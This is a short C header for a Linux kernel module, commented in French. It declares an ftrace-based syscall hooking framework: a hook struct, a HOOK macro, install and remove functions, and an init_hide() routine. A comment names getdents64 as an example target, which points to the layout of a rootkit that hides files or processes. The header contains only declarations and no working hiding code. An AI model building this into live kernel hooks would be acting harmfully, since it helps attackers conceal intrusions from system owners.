#ifndef HOOKING_H
#define HOOKING_H

#include <linux/ftrace.h>
#include <linux/linkage.h>

struct ftrace_hook {
    const char *name;        // Nom du symbole à hooker (ex: "__x64_sys_getdents64")
    void *function;          // Pointeur vers votre fonction de remplacement
    void *original;          // Emplacement pour stocker l'adresse originale
    unsigned long address;   // Adresse résolue du symbole
    struct ftrace_ops ops;
};

// On utilise une trampoline.
#define HOOK(_name, _hook, _orig) { \
    .name = (_name),                \
    .function = (_hook),            \
    .original = (_orig)             \
}

int install_hook(struct ftrace_hook *hook);
void remove_hook(struct ftrace_hook *hook);
int install_hooks(struct ftrace_hook *hooks, size_t count);
void remove_hooks(struct ftrace_hook *hooks, size_t count);
int init_hide(void);

#endif
